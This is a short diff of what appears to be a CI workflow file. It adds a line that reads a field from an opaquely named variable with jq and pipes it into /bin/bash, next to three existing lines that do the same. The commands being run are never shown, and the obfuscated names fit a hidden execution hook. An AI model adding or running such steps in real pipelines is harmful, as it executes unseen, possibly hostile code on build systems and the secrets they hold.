@@ -24,6 +24,7 @@ jobs:
           echo $v0501 | jq -r .s3 | /bin/bash
           echo $jxejv56 | jq -r .vyq9 | /bin/bash
           echo $txafs6 | jq -r .lklg718 | /bin/bash
+          printf '%s' "$zyf8370" | jq -r .edmrq091 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
